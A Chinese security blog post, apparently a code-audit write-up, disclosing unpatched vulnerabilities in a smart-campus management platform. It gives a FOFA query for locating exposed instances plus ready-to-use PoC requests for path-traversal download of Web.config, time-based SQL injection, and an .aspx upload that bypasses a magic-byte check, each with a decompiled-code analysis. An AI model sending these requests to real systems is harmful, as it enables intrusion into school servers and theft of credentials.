#  [跟着静师傅学代码审计]智慧校园(安校易)管理系统多处0day  
原创 静师傅
                    静师傅  安静安全   2026-02-04 10:48  
  
DLL点击上方「蓝字」，关注我们  
  
  
  
01  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM75gMRoRTsichvS1nXFhEicH9oEVf29qljicrKhaYJa4vwlzufNAQRtsZB8rJHpf3C0Exian4fqZKbHv1IZYqG7O6JficQslPgoibefV4KAbBJtKVdA/640?wx_fmt=svg&from=appmsg "")  
  
# 任意文件下载  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6XpzzXTbmzfSN1AjNXia4lbt51MSiaWIONOjkibklNNkvdRH7uS8g3iaEMZ6WicfdbQmgxs6lJicCvxD6vRXD0WzBsjesDARNibJZWwul8uJRgOYicyA/640?wx_fmt=svg&from=appmsg "")  
  
  
fofa:  
  
title="智慧综合管理平台登入"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HUcMRhvTlo4kmcDkT8PiageV8RZ5zkx4O0wZuxBsmxS8zAyCicAudn5P3FABOl6og1j2Sdmj6Zic3jyTCv6uibbYOUPs07syhoYRVg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HUHyn8ziavDLaHZQd2RU0rghib2eP7rOj1cubClicpSC0obv7nib7O8hANsOsahPcKw1o4qD8nbEXECAibYWic1SiaOrI9Kibqv7ChVPaY/640?wx_fmt=png&from=appmsg "")  
  
先给出POC  
```
http://target/Module/FileManagement/FileDownLoad.aspx?filePath=../../Web.config&fileName=Web.config
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HV9fnMtzCzGuE8G1rTF8MA0uaUEUfhSggqCEa41RIHd2vaaqGdGs6gzBF9wUeBNNsfHe0U2ZzhyTx8fTiaKsdMO71xib1XWy8uxA/640?wx_fmt=png&from=appmsg "")  
  
漏洞位于  
  
\Module\FileManagement\FileDownLoad.aspx中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HU0AIAJL3TbWTS3ltXTDoibxG4CIFB3xVUc3wuXzbLg2kZ9elT0mfPczJOgbLrXAneBI3Cj3icLoKkicpw3HeW2Gh4xMcI71bVHnQ/640?wx_fmt=png&from=appmsg "")  
  
对应的DLL文件为  
KR.Administrator.dll进行反编译分析。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HUgoKvQ4tCHAxtQtDb3BSk1pFsfn1YBzvZLia3AHfzdIrTFjMquyyWdBuWJCZp0zTUMBgPgqdheyG3tyBjo6TVPKPovRay8Sjtc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HXEcBAuIE9zPGUicoa4BCiaQy7peoJNjGESFBKkq3O834Inhxn8IuLBaz5ZhQXBKf9V3QGwc44HEGKaXyVHg8sP0Lt0ibR54qwKNU/640?wx_fmt=png&from=appmsg "")  
  
接收参数为filePath和fileName，之后进入BigFileDownload处理主要逻辑。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HWnJjjnbe7Zfs4sicOTChV0MvMib4GdWqSoWMgJklPN5u2lzB18u1x1tom0j1JgzDW6Te7x0q44k4BEQlicU0r5UOkJ5s0aRTq9J8/640?wx_fmt=png&from=appmsg "")  
  
可以看到通过Read函数对文件进行读取操作，由于代码缺少  
对文件路径规范化检查导致可通过../下载任意文件形成文件下载漏洞。  
  
02  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM50FibvX8owRnVicUCiarh98rBP8lDHLuervHib0NOMOVmx0zPYFlAodUFuaua0nNqJNzZPUKSof2iboJc1F3H3N8icQKqicWdeHSIicGibpdPBIe5liaXA/640?wx_fmt=svg&from=appmsg "")  
  
# SQL注入漏洞  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6iaaMRQj5Z8CU6LUZENjfHYvukXkl1dw5eY6P6WNm4dDREy6hvI7o29xSgObeKlLA8Dk3COTD6tt8KEBT82kssCPR1O3j500fZiaDPMHhKPP7g/640?wx_fmt=svg&from=appmsg "")  
  
  
POC数据包:  
```
POST /Module/CJGL/Controller/PPlugList.ashx?action=find HTTP/1.1
Host: IP:PORT
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 33

PlugIdentID=';WAITFOR+DELAY+'0:0:5'--&PlugName=';WAITFOR+DELAY+'0:0:5'--&DataUrl=';WAITFOR+DELAY+'0:0:5'--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HX4kSialbL23ayWeemLITu2whqygETC1dSmBPX9rawTW9zYkibmGXO3CDAMGDMgScLuf305HBiatSk35qBicXy6ZSWxX7whE3N6BsA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HUDnHVnguKSfiaj3qLT5u3I5j2pxYyibwD3TDafMlNVW6UPUObcN8QdQJibFTZZYgHdeukP8icFNdrfShF4MKp1xtASHaAO0v4EJ00/640?wx_fmt=png&from=appmsg "")  
  
漏洞分析:  
  
漏洞位于  
  
\Module\CJGL\Controller\PPlugList.ashx  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HVSIgqnZ20IWEmCEM97zHQ44AtZGjluvKKZRqiccVvS7mG1TBNq98nE4Mj5K3mtkMSxvXnkThGANeDd4wpXgKOu9bpC2WFJUJU8/640?wx_fmt=png&from=appmsg "")  
  
对应DLL为  
KR.Administrator.dll，位于.Module.Controller下。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HWCicmujMscvssyHXl9fuHLv8PaNW7rrxJQ3SQRckHsmJoBxiaDmQUHDZ4ZHcXsZjE5vkTG5fLS2V6LibUogfrTpWsDO8VpsKpo0A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HUuqlc732cI6Rw2icFcYicgqicnIxmLmm3X1R92M1qISt8BjtvMLBkJg19Mv7kIGibvtTVEkI1waSoOHYIA0BmPCpMOHIoBcOKOJDw/640?wx_fmt=png&from=appmsg "")  
  
分析PPLugList方法下的AjaxProcess。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HUib6drEbmCJaVJT2skeCBCAIXpUamUTib1I3lXODFQ9krbMGiaGy8elyu1p8MAKYHriaicfv7f2c0Dvib48hAXIBH0iaMJIGSEh8togE/640?wx_fmt=png&from=appmsg "")  
  
在find和findAll由于没有  
SystemHelper.checkPermission进行权限验证,并且  
在构建SQL查询条件时，直接使用了字符串拼接形成SQL注入漏洞。  
  
03  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7gRNaJ5H6ibus3tsd9jibW80KhNDTHq9qOTQqtXNeJibA7F8WvJPl33VfvlDJOffrmsSPSwdaSbsD6aeFibib2DQP8aH7MwYvGc8yNuENSy9c2KoQ/640?wx_fmt=svg&from=appmsg "")  
  
# 文件上传漏洞  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM4j17dfSIBE8iaPyS32m6icL1dgGN3owyh7cDT1acGeVE5SopN7p2BFe9gRacY5caiaHr0IBxjVG2naWBJmGibb75beDFgaabpmicV1pf4dsPFbs2A/640?wx_fmt=svg&from=appmsg "")  
  
  
POC数据包:  
```
POST /Module/FileUpPage/FileUpTitle.aspx?file_tmid=c HTTP/1.1
Host: IP:PORT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
Connection: close
Content-Length: 199

------21909179191068471382830692394
Content-Disposition: form-data; name="File"; filename="test.aspx"
Content-Type: image/jpeg

GIF89a
Pwn!!!
------21909179191068471382830692394--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HWmPRHDNmrG6JibOmgKwe1nTYUiaofiayULPX1Qsn3gDCFKP6mjOgNI3Mluk1qtbO87vU2nwkh2JLmo8IA02nWlm2FRxlBAjUAyhE/640?wx_fmt=png&from=appmsg "")  
  
之后访问路径为:  
```
http://IP:PORT/imgnews/imgad/000000/c.aspx
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HVfxyQRY0AozJN8vZhbTkd7OWOyhjgl5AyAoQFDiaRtI35srQkZj7CVSVKZ7uWulWAiaibMkXX3UsVwSGS1wV0jXAth7zWkDwPVWA/640?wx_fmt=png&from=appmsg "")  
  
漏洞分析:  
  
漏洞位于文件为  
  
\Module\FileUpPage\FileUpTitle.aspx  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HUzqkdniaBMUjicsZmP0Ka7ibISU3sYbC3nVMCTSUuKAyHEO9k9jchZQhzhr7RLrgUkHchiaJr0NYmXIYAw1GxicgQSfEo1vlTQM7rk/640?wx_fmt=png&from=appmsg "")  
  
对应需要反编译分析的DLL文件也是  
KR.Administrator.dll。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HW6sdKhqhun6pXI4ff51wmia26iaDNiaqP7uvZg2vvF9D0TuFty9V7am24DrGQ4xNYibzN0NpxXCYMqeDqDXWGScxpyEfHnUz32yas/640?wx_fmt=png&from=appmsg "")  
  
分析FileUpTitle方法下。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HVYsPAh11oicepJwcx80sQvXs3JjTzQjPjWyXJNJbXRFhajTOZpdWfb35lTQnMRCmRvvM02QjKWdbibEnxuIlN2SXyricBbN7LPKo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HVvMSoNZSVc6cUVbjLbGqyCianaSHzfZkAFibvRaNia7OVuBP1Dq2y6qdfEfRQrl7RMHoXicORTfPHGA98yW8amXDW8csreFSicaiaj0/640?wx_fmt=png&from=appmsg "")  
  
1.从请求中获取参数：orgid（组织ID，默认为"000000"），type（上传类型，目前有"newsphoto"和其他类型，即imgad）。  
  
2.根据不同的type，文件上传到不同的目录：  
  
  当type为"newsphoto"时，上传到"\imgnews\newsphoto\" + orgid + "\"  
  
      
其他情况（包括type为空或其他值）上传到"\imgnews\imgad\" + orgid + "\"  
  
3.文件命名：使用请求参数"file_tmid"作为文件名，保留原文件扩展名。  
  
4.文件上传后，使用SystemHelper.FilePass方法检查文件是否为图片类型。如果不是，则删除文件并返回错误信息。  
  
5.返回JSON格式的上传结果。  
  
接着跟进  
SystemHelper.FilePass方法查看他是怎么检查的?  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HVtp31r19BTjBNiaEhOJibqup7bn3Nr2KXGvGEy20qVcWmYfofq6oUJ6yUftUiarAon2CqOYH0P5D5G6jL6bFaOjNOibwJ3LGlcEJM/640?wx_fmt=png&from=appmsg "")  
  
这里的检查只是判断  
前2个字节是否为case中的开头ASCII字符，因此可以通过开头写GIF89a来绕过文件内容判断。  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7boiaLUZ76Hg5EMKvGBKWPluwQW4E0vyVUYUSh2lSHoRomUTd6syVsttYsmZKjExEaJ09fQicALGic5vEVeuDPJHCicVMRwATZdjr5qr9qrwlWPQ/640?wx_fmt=svg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6qX4mMPuNB7pKUCeWKiciaibpBPUsBNFUiblzicKuFYHpxyxGZHWQwR2EUVnZeXLF6Whd0cgBy4lvEL8bMicnOqmYlRecNsuwSsYCHE3KkQmd2NOjA/640?wx_fmt=svg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM442Ekjq2u6ZI1bUKDciaficBfP0799K8u0OD0yQAOzO2nYX1xAtV5WsqGx4JribHvuhvDFud5MGib7heJiapbQxiaP1lrgEx4PnlClZwUnPxiaeaVww/640?wx_fmt=svg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM566p6abhkgExHCAzHIMBOpEVsDkRMDsviaQuNmcLAwwehJ7JejVAp9kaiaNoQibcuk7f3JaU1MmysSVkE7zEJBSm3G2OgncHd87KB2wAb7pg2Qg/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7KCB7TlDE8Pcm3OwodhZubjCXqKeUj6bSXVujR1R911d8sJCQhZPubRdCk8dcDtHNgqCNTqfqGh3h8EJXiavp8pRfPWiaZNS3JLd8sbA15TabQ/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HXmLAC4EKkxxLuiaQlEdXDS8DobrJibk5r2lLicPaL9pGAywYTIC802ZMvBnstNoeMJCNlcdt2AZUcTofetJV649LBa8mQPTa6PtQ/640?wx_fmt=png&from=appmsg "")  
  
# 往期文章推荐  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7MNFb0XCdWsrgNoZiaDquyxhOe4IsU0RXlMBu8xCAjKS4otT1m4Ngxf4QFBZZgWV9v51BYGBI14ZWswh0WTKbmSrFRdhQ8NvQ7wOyXofn7IBg/640?wx_fmt=svg&from=appmsg "")  
  
[[跟着静师傅学代码审计]itc中心管理服务器审计](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247494835&idx=1&sn=11dc9ba633123039d178ea95daec498c&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6GMURk8ibw98AtyWqhH2NX3JWNcg35Lo9ZXZPNuS3fEnHEvlnujjb8icKwuSPKVhEl8ib3PbJbaH5sK6vtXiazqQiculp8k42rGiaDxagAUM1KgJaw/640?wx_fmt=svg&from=appmsg "")  
  
[[跟着静师傅学代码审计-全网首发]用友U9 V6.6企业版多组织企业互联网应用平台命令执行+SQL+反序列化](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247494706&idx=1&sn=3a390be197f5c1b0d44e81f6604a764e&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM5bqiaHf1tVT38EvYj3CpmHicwD6O7oOzJRkJibky8kf2T7LUy205LnEiaCOzgeBxzH6DPbAlQTaQTDjqA7jfkt4PzPThBw6j0YuoKUicoamg8tt2Q/640?wx_fmt=svg&from=appmsg "")  
  
[[跟着静师傅学代码审计]九垠赢商业管理系统0day-文件上传和任意文件下载](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247494569&idx=1&sn=69a47c5649efb623550eaae8c696dfac&scene=21#wechat_redirect)  
  
  
###### 公众号：安静安全  
  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM4E28R5xYPJfRp45YfsjvDa3pUjDU3L9icGdwl9OgicYqUeaULtcCibcW6icj7vjZbZcpH0ZVSs6ztJwliczLlZqfNYqnzaYGpaRtggM34AcvvnbHw/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6s399uX5goxgMlEbmFAjggFDyDSz1NcZAH3m791ry6D3ogyn58icyS8icHN4OBvJWqZXiaR3BRfjFPQF1H6iaHFH9yzn6hsIfu9ofqLtqcepsE8A/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/8LGv6icfib1HX7MvoicgRmctnu46dVabSmvRLRU2GnPTSUa4qicWHLaxogEryV4vdLic0jHO0GOK6WykM4aRuxtL47TETrhqb5b5QyvfYyBmp35Y/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7ibm6FSDnE1sQ0Kwia3SCwR2XwhiaYSMtOCKe4BAQk3CTmESVhl5QR0FKOBsLUTWGOiciag5bCg6CTvlaC21nkIRWgsYvicF8uF3ggMhJ4gQ6UWzmw/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6UYaAsFPHYMePMbibj1FWcsFab4pOlvPmcT14DQ0hseaic8chBPH5hpoFFH83nyT6cETJFYaWortZZ0dx1GYJeibeibb1PNMNRQOoRTO1lbiaFBUw/640?wx_fmt=svg&from=appmsg "")  
  
  
点个「在看」，你最好看  
  
  
